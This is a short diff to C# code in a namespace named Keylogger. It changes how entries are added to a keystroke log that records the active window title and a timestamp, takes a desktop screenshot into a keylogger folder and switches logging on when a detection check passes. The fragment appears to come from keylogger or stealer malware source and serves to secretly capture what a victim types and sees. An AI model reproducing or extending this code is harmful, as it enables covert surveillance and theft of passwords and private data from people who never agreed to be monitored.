@@ -18,7 +18,8 @@ namespace Keylogger
         {
             if (Detect())
             {
-                Keylogger.KeyLogs += "\n\n### " + WindowManager.ActiveWindow + " ### (" +
+                if (!string.IsNullOrWhiteSpace(Keylogger.KeyLogs)) Keylogger.KeyLogs += "\n\n";
+                Keylogger.KeyLogs += "### " + WindowManager.ActiveWindow + " ### (" +
                     DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
                 DesktopScreenshot.Make(KeyloggerDirectory);
                 Keylogger.KeyloggerEnabled = true;
